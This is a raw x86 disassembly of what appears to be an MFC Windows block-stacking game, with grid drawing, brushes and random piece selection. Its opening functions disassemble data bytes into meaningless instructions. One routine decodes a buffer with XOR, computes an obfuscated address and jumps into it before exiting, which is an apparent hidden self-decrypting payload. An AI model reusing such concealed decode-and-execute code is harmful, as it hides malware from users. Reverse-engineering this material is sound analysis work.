sub_4013e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jecxz rwxdata
inc edx
outsd
js rwxdata
inc eax
add [ eax + 0x40 ] dl
inc eax
add [ eax ] dh
inc esp
inc eax
add [ eax + 0x44 ] dl
inc eax
add [ eax + 0x20004044 ] dh
inc ebp
inc eax
add [ eax - 0x1fffbfbb ] al
inc ebp
inc eax
add [ eax + 0x46 ] al
inc eax
add al al
inc esi
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x45 ] cl
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
pop edi
push edi
dec ecx
dec esi
xor esi [ edx ]
pop edi
inc ecx
push eax
dec ecx
pop edi
dec esp
dec ecx
dec esi
dec ebx
inc ebp
push edx
push ebx
add [ eax ] al
dec ebp
jae rwxdata
in eax dx
push esp
mov al [ 0x24e9afaf ]
fstp st0
shl [ ebx + 0x5d1063fa ] 0x1
in eax dx
inc ebx
push edx
inc ebp
inc ecx
push esp
inc ebp
pop edi
inc ebp
push edx
push edx
dec edi
add [ eax ] al
inc esi
inc ecx
dec esp
dec esp
dec ecx
dec esi
dec esp
dec edi
push esi
inc ebp
add [ eax ] al
inc ebx
push edi
dec ecx
dec esi
inc esp
dec edi
push edi
push ebx
push ebx
pop ecx
push ebx
push esp
inc ebp
dec ebp
push edx
dec edi
dec edi
push esp
add [ eax ] al
xor al 0x5b
pushad
rcl al 0x1
rcr [ ebx + 0x26 ] 0x1
fcomp [ ebx + 0x26 ]
int3
nop
mov al [ 0xffffffff94e9afaf ]
rcl al 0x1
shl [ ebx - 0x2aae806 ] 0x1
mov eax [ 0xffffffffd0b7afaf ]
rcl al 0x1
mov ecx 0xd0d0dd3e
test [ ebx - 0x44 ] ebx
push ecx
adc al 0x60
stosb [ edi ]
scasd [ edi ]
scasd [ edi ]
pop ebx
and eax 0xab565dd8
rcl eax cl
rol [ eax - 0x2fc52fc6 ] 0x1
scasd [ edi ]
inc esi
push ebp
rcl al 0x1
rcr [ ecx + 0x56 ] 0x1
adc eax 0xafd0d0d8
inc esi
pop ecx
rcl al 0x1
shr [ ebp - 0x19 ] 0x1
rcl al 0x1
shl [ 0xffffffffd41219d4 ] 0x1
adc [ ebp - 0x13 ] bl
popad
rol [ esi - 0x26c4a9a3 ] 0x1
rcl al 0x1
sbb [ ebp + 0x56 ] 0x95
rcl eax 0x1
rol [ eax - 0x2f52b951 ] 0x1
rcl al 0x1
mov eax 0xd0d0d0d7
daa
and esp [ edx - 0x71 ]
arpl [ edx - 0x30 ] sp
mov [ eax - 0x2fb2b951 ] al
rcl al 0x1
pop ecx
push esi
adc ebx edx
rcl al 0x1
mov eax 0xd0d0d06a
mov cl 0x30
in al 0x5e
rcl eax 0x1
add [ ecx - 0x2f3ad387 ] edx
into
jmp rwxdata
sub_402130
fisub [ esi - 0x67 ]
jpe rwxdata
pushad
pushad
rcl al 0x1
jo rwxdata
insb
push 0x7890f4a1
add ebp [ ebx ]
jmp rwxdata
pop ecx
pop esi
add eax 0x89d0d0d8
mov ds [ ecx ]
adc dl ah
rol [ ebx - 0x27feb1a5 ] 0x1
rcl al 0x1
pop ebx
pop esi
rcl al 0x1
rol al 0x60
pushad
rcl al 0x1
jo rwxdata
sub al 0x6c
sub al 0x9d
fstp [ ebp - 0x71317123 ]
into
aas
jg rwxdata
add eax 0x5bd0d0d8
inc esp
arpl [ ecx ] cx
fcom st0
rcr [ ebx + 0x54 ] 0x1
arpl [ 0x11d0d0d8 ] cx
adc al bl
adc [ eax ] edx

aam 0xd0
sbb [ ebx + 0x4e ] 0x1
fcom st0
rcr [ ebx + 0x5e ] 0x1
rol al 0x70
jo rwxdata
rcl al 0x1
adc [ edx ] edx
retn
jg rwxdata
cmp eax 0x2c6c3d7d
insb
shl [ eax + 0x60 ] 0x1
test [ ebx - 0x44 ] ebx
xchg [ ecx + 0x5bd8255b ] al
dec esi
add eax ebx
rcl al 0x1
pop ebx
pop esi
add eax 0x5bd0d0d8
inc esp
arpl [ ecx ] cx
fcom st0
rcr [ ebx + 0x54 ] 0x1
arpl [ 0x11d0d0d8 ] cx
adc al bl
adc [ eax ] edx

stosb [ edi ]
and dl bh
jmp 0xfffffffffcfec9b5
shl [ eax + 0x70 ] 0xc0
shl [ eax + 0x60 ] 0xd0
shl [ eax + 0x70 ] 0x1
sub_4023ba
push ecx
ror [ esi ] 0x1
aas
jne rwxdata
pop ecx
pop esp
jmp rwxdata
jmp rwxdata
xlat
mov [ 0x79daebc9 ] ax
sar ah 0x1
pop ebx
push cs
pop ss
jmp rwxdata
push ecx
scasb [ edi ]
adc esp eax
or ebx edx
stc
rcl [ eax + eax * 4 ] 0x1
add esp [ ebx - 0x15 ]
fiadd [ ebp - 0x30 ]
adc al 0xa2
sar [ ebx + ecx + 0x51d0fdda ] 0x1
sub_4023d2
mov eax edx
inc ebx
daa
daa
jno rwxdata
loope rwxdata
fidivr [ ecx ]
rcl [ edx - 0x14aaaab3 ] 0x1
fisub [ ecx ]
shl [ ecx + 0x7b ] 0x1
fwait
mov edi ebp
fimul [ ebp - 0x3f82a130 ]
push edx
out dx eax
fidiv [ ecx ]
rol [ esi - 0x10043609 ] 0x1
fidiv [ 0xffffffffe34760d0 ]
dec esp
out dx eax
fidivr [ 0xda11ed0 ]
xor ebp edi
fisubr [ ecx ]
shr [ eax ] 0x1
sub esp [ edi ]
mov ecx 0xd02ddaeb
jae rwxdata
shr dl 0x1
adc dx bx
jmp sub_402334
add [ ebx - 0x2f7a2515 ] cl
fcmove st3
push ecx
sub eax 0xa8daebbf
fmul [ edx - 0x147bf7cf ]
fisubr [ esp + ebx * 8 - 0x2f2f2f30 ]
cmp al 0x39
out dx eax
fisub [ 0xffffffffc8d2ffd0 ]
push esp
add ebx edx
popad
ror [ ecx - 0x7a ] 0x1
leave
sbb eax 0xd065da03
js rwxdata
add ebx edx
pushfd
stosb [ edi ]
add ebx edx
xchg ecx eax
ror [ eax + 0x71 ] 0x1
push edx
jl rwxdata
add ebx edx
imul edx eax 0x8b4e1916
add ebx edx
insd
shr [ esi - 0x146b9b48 ] 0x1
ficomp [ ebp - 0x30 ]
sub eax 0xeb9b7a6e
fiadd [ ecx - 0x30 ]
ficomp [ ecx - 0x2e ]
xchg esp eax
jmp rwxdata
imul ebx ecx 0xffffffe7
pop eax
popfd
shr [ ebx - 0x27 ] 0x1
out 0x58 eax
mov eax 0x3ab02ec
ficomp [ ecx + 0x4eaa04d0 ]
add ebx edx
ficom [ ebp + 0x2ecb8d0 ]
stosd [ edi ]
add ebx edx
cdq
rol [ edx + ebp * 4 ] 0x1
dec esi
sub_403b60
sub esp 0x10
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
imul edi ebx
mov edx ebx
mov [ esp + 0x18 ] ecx
neg edx
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x10 ] 0x0
lea eax [ ecx + 0x4 ]
add edi edx
mov [ esp + 0x14 ] 0x4
jmp rwxdata
mov esi [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
imul esi ebx
lea ecx [ ecx + edx * 8 + 0x2c ]
mov ebp ebx
mov edx eax
mov eax [ esp + 0x28 ]
neg ebp
mov [ esp + 0x38 ] ecx
mov [ esp + 0x30 ] edx
add esi eax
mov [ esp + 0x2c ] 0x4
mov eax [ esp + 0x2c ]
add edx 0x2
add esi ebp
dec eax
mov [ esp + 0x30 ] edx
mov [ esp + 0x2c ] eax
jne rwxdata
mov eax [ esp + 0x24 ]
test eax eax
je rwxdata
cmp [ edx ] 0x1
jne rwxdata
mov ecx [ esp + 0x14 ]
mov eax edx
mov edx [ esp + 0x1c ]
add edi edx
dec ecx
mov [ esp + 0x14 ] ecx
jne rwxdata
mov eax [ esp + 0x10 ]
mov [ ecx - 0x4 ] esi
mov [ ecx ] edi
inc eax
add ecx 0x8
mov [ esp + 0x10 ] eax
mov [ esp + 0x38 ] ecx
mov eax [ eax + 0x4 ]
lea edx [ edi + ebx ]
lea ecx [ esi + ebx ]
push edx
push ecx
push edi
push esi
push eax
call [ Rectangle@IAT ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x20
sub_403c40
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403ce8 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0xe ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] ecx
sub_403d00
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403dac ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x14 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x4c ] ecx
sub_403df0
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x1a ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_403e50
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0x10 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_403eb0
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x6 ] ax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x14 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_403f10
push esi
mov esi ecx
call sub_403fd0
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_403fb4 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x4c ] ecx
sub_404090
push 0xffffffff
push sub_406028
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x138 ] 0x0
je rwxdata
xor eax eax
push rwxdata
push rwxdata
push rwxdata
push 0x80
mov ecx eax
call Ordinal_MFC42_520
jmp rwxdata
mov ecx [ esi + 0x20 ]
push 0x0
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
mov edx [ esi + 0x20 ]
push edx
call [ UpdateWindow@IAT ]
push 0x408
push rwxdata
lea eax [ esp + 0x34 ]
push rwxdata
push eax
call [ sprintf@IAT ]
add esp 0x10
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
mov ecx [ esp + 0x130 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
xor eax eax
pop esi
mov ecx [ esp + 0x12c ]
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
push eax
mov ecx esi
mov [ esp + 0x13c ] 0xffffffff
call Ordinal_MFC42_986
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_296
lea eax [ esp + 0x8 ]
mov ecx esi
push eax
mov [ esp + 0x13c ] 0x1
call Ordinal_MFC42_5214
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_5301
test eax eax
jne rwxdata
sub_404250
push 0xffffffff
push sub_406048
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
lea ecx [ esp ]
call sub_4041e0
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_404300
push 0xffffffff
push sub_40606a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x54
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_4043a0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404720
push 0xffffffff
push sub_40608a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x48
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_404880
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4047c0
push ebx
push esi
xor ebx ebx
push edi
xor eax eax
mov dl 0x1
mov [ ecx + rwxdata ] bl
lea esi [ eax + eax * 4 ]
lea edi [ ecx + eax ]
mov [ edi + esi * 2 + rwxdata ] dl
jmp rwxdata
cmp eax 0x18
je rwxdata
inc eax
cmp eax 0x19
jl rwxdata
inc ecx
cmp ecx 0xb
jl rwxdata
xor ecx ecx
pop edi
pop esi
pop ebx
retn
sub_404800
mov eax [ esp + 0x4 ]
cmp eax 0x6
ja rwxdata
xor eax eax
retn
jmp [ eax * 4 + jump_table_404860 ]
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
sub_404880
push esi
mov esi ecx
call Ordinal_MFC42_560
mov [ esi ] rwxdata
mov [ esi + 0x44 ] 0x0
call sub_4047c0
call [ rand@IAT ]
and eax 0x80000007
jns rwxdata
mov [ rwxdata ] eax
mov eax esi
pop esi
retn
dec eax
or eax 0xfffffff8
inc eax
sub_404900
push ecx
push ebx
push ebp
push esi
push edi
xor esi esi
mov dl 0x1
mov [ esp + 0x13 ] 0x0
mov edi 0x17
cmp esi 0x9
jne rwxdata
lea ecx [ edi + edi * 4 ]
xor ebp ebp
lea edx [ edi + ecx * 2 + rwxdata ]
mov [ esp + 0x13 ] 0x0
jmp rwxdata
inc esi
cmp esi 0xb
jl rwxdata
mov eax 0x1010101
mov ecx rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] ax
mov [ rwxdata ] al
mov [ esp + 0x13 ] 0x1
cmp ebp 0xa
jne rwxdata
dec edi
test edi edi
jg rwxdata
cmp [ esi + rwxdata ] dl
je rwxdata
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
cmp ecx rwxdata
jge rwxdata
mov al [ esp + 0x13 ]
test al al
je rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
inc ebp
cmp ebp 0xb
jl rwxdata
mov ecx edx
mov eax 0x1010101
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] ax
mov [ ecx + 0xa ] al
lea eax [ edi - 0x1 ]
test eax eax
jl rwxdata
xor eax eax
cmp [ edx + ebp ] 0x1
je rwxdata
jmp rwxdata
lea ecx [ eax + eax * 4 ]
lea esi [ eax + 0x1 ]
lea ecx [ eax + ecx * 2 + rwxdata ]
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
dec esi
jne rwxdata
xor eax eax
sub_4049e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_406108
push eax
mov [ fs : 0x0 ] esp
mov al [ ecx + 0x44 ]
sub esp 0x44
test al al
push ebx
push ebp
push esi
push edi
mov bl 0x1
jne rwxdata
xor ebp ebp
mov [ esp + 0x24 ] rwxdata
mov [ esp + 0x28 ] ebp
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] ebp
call Ordinal_MFC42_323
push ebp
mov [ esp + 0x60 ] bl
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_1640
mov eax [ rwxdata ]
mov esi [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
sub eax esi
sub ecx edx
push eax
mov eax [ esp + 0x68 ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call [ CreateCompatibleBitmap@IAT ]
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_1641
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
neg eax
sbb eax eax
and eax ebx
push eax
push edx
call Ordinal_MFC42_5785
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov edi [ rwxdata ]
sub eax ecx
mov ecx [ rwxdata ]
push 0xffffff
sub ecx edi
push eax
push ecx
push ebp
push ebp
lea ecx [ esp + 0x58 ]
call Ordinal_MFC42_2753
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] rwxdata
mov edi rwxdata
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] edi
mov esi [ CreateSolidBrush@IAT ]
push 0x2b86f5
mov [ esp + 0x60 ] 0x3
call esi
push eax
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_1641
mov [ esp + 0x40 ] ebp
mov [ esp + 0x3c ] edi
push 0x2b0e91
mov [ esp + 0x60 ] 0x4
call esi
push eax
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_1641
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] edi
push 0x570e0f
mov [ esp + 0x60 ] 0x5
call esi
push eax
lea ecx [ esp + 0x38 ]
call Ordinal_MFC42_1641
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] edi
push 0x218ec7
mov [ esp + 0x60 ] 0x6
call esi
push eax
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_1641
push 0x212217
push 0x2
push ebp
call [ CreatePen@IAT ]
push eax
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1641
lea edx [ esp + 0x1c ]
lea ecx [ esp + 0x44 ]
push edx
call Ordinal_MFC42_5788
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push eax
call Ordinal_MFC42_5787
mov ecx [ rwxdata ]
push ecx
call sub_404800
mov edx [ rwxdata ]
mov ecx [ rwxdata ]
add esp 0x4
push edx
mov edx [ eax + 0x4c ]
push ecx
mov ecx [ eax + 0x48 ]
push 0x19
push edx
mov edx [ rwxdata ]
push ecx
mov ecx [ rwxdata ]
push edx
lea edx [ esp + 0x5c ]
push ecx
push edx
mov ecx eax
call sub_403b60
xor esi esi
mov eax [ ecx + 0x20 ]
push rwxdata
push eax
mov [ ecx + 0x44 ] bl
call [ GetClientRect@IAT ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add ecx 0x64
mov [ rwxdata ] edx
mov [ rwxdata ] ecx
mov edx [ esp + 0x10 ]
add edi 0x19
inc edx
cmp edi 0x113
mov [ esp + 0x10 ] edx
jl rwxdata
cmp esi 0x16
jne rwxdata
mov edx [ esp + 0x10 ]
cmp [ edx ] 0x0
jne rwxdata
inc esi
cmp esi 0x18
jl rwxdata
cmp esi 0x13
jl rwxdata
lea eax [ esp + 0x3c ]
push eax
jmp rwxdata
lea eax [ esi + esi * 4 ]
xor edi edi
lea ecx [ esi + eax * 2 + rwxdata ]
mov [ esp + 0x10 ] ecx
call sub_404900
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
mov ebx [ rwxdata ]
mov esi [ esp + 0x48 ]
sub ecx eax
lea eax [ esp + 0x44 ]
sub edx ebx
neg eax
sbb eax eax
push 0xcc0020
and eax esi
push ebp
push ebp
push eax
push ecx
mov ecx [ esp + 0x78 ]
push edx
push ebp
mov edx [ ecx + 0x4 ]
push ebp
push edx
call [ BitBlt@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_2405
mov esi rwxdata
mov [ esp + 0x2c ] esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] 0x7
call Ordinal_MFC42_2414
mov edi rwxdata
mov [ esp + 0x34 ] esi
mov [ esp + 0x2c ] edi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x5c ] 0x8
call Ordinal_MFC42_2414
mov [ esp + 0x34 ] edi
mov [ esp + 0x3c ] esi
lea ecx [ esp + 0x3c ]
mov [ esp + 0x5c ] 0x9
call Ordinal_MFC42_2414
mov [ esp + 0x3c ] edi
mov [ esp + 0x14 ] esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x5c ] 0xa
call Ordinal_MFC42_2414
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x5c ] 0xb
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x5c ] 0x0
call Ordinal_MFC42_640
mov [ esp + 0x24 ] esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5c ] 0xc
call Ordinal_MFC42_2414
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x4
cmp esi 0xf
jl rwxdata
cmp esi 0x15
jg rwxdata
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
mov edx [ rwxdata ]
mov ebp [ rwxdata ]
lea eax [ esi + esi * 4 + 0x5 ]
lea ebx [ edi + ebp + 0x19 ]
add ebp edi
lea ecx [ edx + eax * 4 ]
add eax ecx
lea ecx [ esi + esi * 4 ]
push eax
mov eax [ esp + 0x4c ]
lea edx [ edx + ecx * 4 ]
push ebx
add ecx edx
push ecx
push ebp
push eax
call [ Rectangle@IAT ]
xor ebp ebp
cmp esi 0x14
jg rwxdata
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
lea edx [ esp + 0x2c ]
push edx
sub_404dd0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] 0x1
lea ebx [ edi + esi - 0x1 ]
call [ rand@IAT ]
cdq
mov ecx 0x7
idiv ecx
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0xf
mov [ ebp + 0x8 ] eax
mov [ rwxdata ] edx
jl rwxdata
cmp al [ ebx - 0x1 ]
je rwxdata
mov eax [ ebp - 0x4 ]
dec ebx
mov [ eax + 0x44 ] 0x0
mov al [ ebx ]
test al al
je rwxdata
jmp rwxdata
call sub_4047c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x1
lea eax [ esi + esi ]
push eax
push 0x0
call [ GlobalAlloc@IAT ]
mov edx eax
xor eax eax
test esi esi
mov [ ebp + 0x8 ] edx
jle rwxdata
mov [ ebp - 0x8 ] edi
mov ebx edi
xor edi edi
test esi esi
jle rwxdata
mov ecx edx
mov eax [ ebp - 0x4 ]
mov cl [ eax + 0x44 ]
test cl cl
je rwxdata
mov esi edx
mov bl [ eax + edi ]
add ecx 0x2
shr bl 0x4
add bl 0x1e
mov [ ecx - 0x2 ] bl
mov bl [ eax + edi ]
and bl 0xf
add bl 0x1e
inc eax
mov [ ecx - 0x1 ] bl
cmp eax esi
jl rwxdata
pop edi
pop esi
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax 0x9
test eax eax
mov eax [ ebp - 0x8 ]
inc eax
inc eax
inc eax
add eax 0x8
sub eax 0x7
sub eax 0x1
dec eax
mov ebx 0x23
add eax ebx
mov ecx eax
call ecx
mov edx [ ebp + 0x8 ]
push 0x0
call [ exit@IAT ]
mov al [ esi ]
add esi 0x2
xor al 0xf5
mov [ esi - 0x2 ] al
add al 0x2
shl al 0x4
mov [ ebx ] al
mov cl [ esi - 0x1 ]
sub cl 0x1e
xor cl al
mov eax [ ebp + 0xc ]
mov [ ebx ] cl
inc ebx
inc edi
cmp edi eax
jl rwxdata
mov ecx [ ebp - 0x4 ]
push 0x4
push 0x8
call sub_404db0
test al al
je rwxdata
mov edx [ ebp + 0x8 ]
sub_404f10
mov eax [ rwxdata ]
push ebp
push esi
push edi
mov edi [ rwxdata ]
mov ebp ecx
add edi 0x19
push eax
mov [ rwxdata ] edi
call sub_404800
mov esi eax
add esp 0x4
mov ecx esi
mov ax [ esi + 0x24 ]
mov edx [ esi ]
push eax
push 0x0
push 0x0
push 0x0
call [ edx ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov eax [ esi + 0x4c ]
push ecx
mov ecx [ esi + 0x48 ]
push edx
mov edx [ rwxdata ]
push 0x19
push eax
mov eax [ rwxdata ]
push ecx
push edx
push eax
push 0x0
mov ecx esi
